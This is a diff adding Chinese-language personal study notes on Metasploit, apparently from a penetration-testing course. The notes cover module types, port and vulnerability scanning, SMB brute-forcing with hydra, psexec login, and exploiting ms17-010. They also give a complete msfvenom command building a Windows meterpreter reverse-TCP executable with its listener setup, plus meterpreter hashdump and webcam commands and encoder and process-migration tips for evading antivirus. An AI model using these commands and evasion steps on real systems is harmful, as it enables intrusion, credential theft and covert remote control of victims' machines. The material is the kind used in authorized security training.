@@ -1,0 +1,130 @@
+主要包括
+	信息收集、密码破解、漏洞利用、payload木马生成、后渗透模块
+超级重要
+漏洞利用框架 msfconsole 模块化
+shellcode 包括payload
+主要是getshell 之后用来 提权、回话，反弹、穿越
+
++ -- --=[ 1960 exploits - 1094 auxiliary - 336 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion  
+exploits 攻击载荷 主要针对于漏洞利用
+post 用来反弹会话时用到的
+payloads 木马
+encoders 给payload 加密 bypass av
+nops 填充空白代码 
+auxiliary 辅助模块
+evasion 躲避杀软
+
+建立会话之后
+使用search suggester 使用检索目标系统有哪些漏洞补丁没有打上的  将没有打补丁的漏洞与可以利用的漏洞对比(也可以使用自动对比)
+
+
+显示exploits、payloads 
+msf5 > show exploits
+msf5 > show payloads
+
+使用最多的信息模块
+msf5 > search portscan
+   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
+   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
+use 5 / use auxiliary/scanner/portscan/tcp 
+
+攻击服务的方法
+			1、漏洞利用
+			2、账号爆破 
+			3、服务欺骗
+			4、服务钓鱼 
+			
+			ftp 服务器软件 server-u (2003) filezzlia g6ftp flashfxp
+			
+			cs是将msf 中的payload listener 模块 提取图形化 也有漏洞提权、漏洞利用
+			
+			开了telnet、smb、rdp 爆破账号密码 使用smb爆破速度快
+			使用账号密码 连接ssh ftp (ssh ip  / ftp ip)
+			hydra爆破smb
+			如果爆破到了smb账号密码 但是telnet、ftp、rdp都没有开放如何进行连接？
+			使用工具 psexec.exe \\ip -l administrator -p 123123 cmd.exe
+			
+			如何在linux开启连接3389？
+			apt-get install rdesktop
+			rdesktop ip 
+			3389强制登录器
+			windows 下 mstsc 
+			cve_2019_0708
+
+
+扫描漏洞
+nmap --script vuln ip
+nmap --script smb-vuln-* ip
+
+nessus 扫描服务漏洞
+
+使用msf search ms17-010 然后利用
+
+msfvenom简介  绕过杀软
+
+编码:一般11-17次 5-8(效果不好)
+
+查看可以利用的payload
+msfvenom --list payload
+reverse(反弹链接) 是他连接我,我做好侦听就OK了  
+	好处：可以穿越防火墙
+bind 是我连接他  用得不多 （主要在后渗透模块中使用） 
+	但是防火墙一般都是拦截外部进入服务器的流量，而不会拦截从服务器往外的流量 
+防火墙拦截的是这种 ms17-010 漏洞利用  防火墙不会拦截payload,有的防火墙还会拦截协议
+
+
+msfvenom --list decoders 查看可以使用的的编码器 
+用的比较多的编码器(效果较好的编码器) --excellent 
+x86/shikata_ga_ nai  excellent 多态编码器(每次采用的编码是随机的，生成payload 不一样)
+过windows defender 视频 
+bypass av msf
+
+
+不同的payload反弹的meterpreter控制会话权限是不一样的 
+主要看payload使用的脚本和协议  
+eg：
+		windows/meterpreter/reverse_tcp a.php 只是网络用户
+		php/meterpreter/reverse_tcp			a.exe 系统进程调用执行
+		use incognito php的就不能使用
+		
+		生成payload脚本 没有进行编码、没有指定平台架构
+		msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.149.142 lport=1122 -f exe > a.exe
+		
+		kali设置侦听 
+		use exp/mul/handler
+		set payload windows/meterpreter/reverse_tcp 
+		set lhost 192.168.149.142
+		set lport 1122
+		run
+		
+		建立会话
+		meterpreter>help  查看命令
+		
+		文件命令
+		网络命令
+		系统命令
+		用户接口类型命令
+		摄像头命令
+		密码读取 hashdump
+		
+		要么在生成payload的时候就设置自动迁移进程，要么在获取反弹会话后立即迁移进程 主要是为了建立的会话稳定，
+		以及躲避杀软的动态查杀
+		
+		进程迁移命令
+		
+		
+		公网服务器 3389 转发到 其他端口上 估计就能够进行连接 
+		绕过对ip+端口的限制  --主要是有的端口指定只有固定的ip地址(管理员)才能访问
+
+
+
+比如想查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项，可以使用msfvenom -p windows/meterpreter/reverse_tcp --list-options
+
+msfvenom --list payloads可查看所有payloads
+
+msfvenom --list encoders可查看所有编码器
+评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器
+
+类似可用msfvenom --list命令查看的还有payloads, encoders, nops, platforms, archs, encrypt, formats
